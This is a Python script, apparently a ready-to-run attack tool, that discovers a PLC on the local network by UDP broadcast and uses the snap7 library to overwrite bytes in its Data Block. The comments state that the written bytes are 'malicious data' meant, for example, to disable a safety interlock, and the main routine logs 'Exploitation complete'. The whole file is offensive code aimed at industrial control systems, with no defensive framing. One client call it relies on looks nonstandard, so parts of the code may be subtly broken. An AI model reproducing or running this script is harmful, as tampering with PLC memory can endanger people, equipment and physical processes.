import snap7
import socket
import struct
import sys
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define PLC details (initial, may be overwritten by IP discovery)
PLC_IP = "192.168.1.10"  # Default IP, change or use IP discovery
RACK = 0
SLOT = 1
DB_NUMBER = 1  # Example: Data Block number where you want to write.  Adjust to your PLC's configuration.
START_ADDRESS = 0  # Example: Start address within the Data Block. Adjust.
BYTE_LENGTH = 2 # Example: Number of bytes to overwrite.  Adjust.
MALICIOUS_DATA = b"\x00\x00"  # Example: Malicious data to write (e.g., disabling a safety interlock).

def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address using a simple broadcast ping.
    This is a rudimentary approach and might not work in all network configurations.
    Consider more robust discovery methods for production environments.
    """
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(2)  # Timeout after 2 seconds

        # Craft a simple "ping" message (adjust based on expected PLC response)
        message = b"PLC_DISCOVERY_PING"  # A simple request

        # Send the message to the broadcast address
        sock.sendto(message, ('<broadcast>', 2222))  # Port number, adjust as needed

        # Listen for a response
        try:
            data, addr = sock.recvfrom(1024)
            logging.info(f"Received response: {data} from {addr}")
            return addr[0]  # Return the IP address of the sender
        except socket.timeout:
            logging.warning("No response received from PLC during IP discovery.")
            return None
        finally:
            sock.close()

    except Exception as e:
        logging.error(f"Error during IP discovery: {e}")
        return None



def exploit_vulnerability(plc_ip, rack, slot, db_number, start_address, byte_length, malicious_data):
    """
    Exploits a potential vulnerability by overwriting data in a PLC's Data Block.
    This is a simplified example and should be adapted based on actual vulnerabilities.
    """
    try:
        plc = snap7.client.Client()
        plc.set_as_string(False) # Use bytearray mode.
        plc.connect(plc_ip, rack, slot)

        # Read existing data (optional, but good practice to avoid immediate crashes)
        #old_data = plc.db_read(db_number, start_address, byte_length)
        #logging.info(f"Original data at DB{db_number}.DBB{start_address}: {old_data}")

        # Overwrite the data with malicious data
        logging.warning(f"Writing malicious data to DB{db_number}.DBB{start_address}: {malicious_data.hex()}")
        plc.db_write(db_number, start_address, malicious_data)

        # Verify the write (optional)
        #new_data = plc.db_read(db_number, start_address, byte_length)
        #logging.info(f"New data at DB{db_number}.DBB{start_address}: {new_data}")

        plc.disconnect()
        logging.info("Exploitation complete. PLC disconnected.")

    except snap7.exceptions.Snap7Exception as e:
        logging.error(f"Snap7 error: {e}")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")


if __name__ == "__main__":
    logging.info("Starting PLC exploitation script...")

    # Attempt to discover the PLC's IP address
    discovered_ip = discover_plc_ip()
    if discovered_ip:
        PLC_IP = discovered_ip
        logging.info(f"PLC IP address discovered: {PLC_IP}")
    else:
        logging.warning(f"Could not automatically discover PLC IP. Using default IP: {PLC_IP}.  Ensure this is correct.")

    exploit_vulnerability(PLC_IP, RACK, SLOT, DB_NUMBER, START_ADDRESS, BYTE_LENGTH, MALICIOUS_DATA)
    logging.info("Script finished.")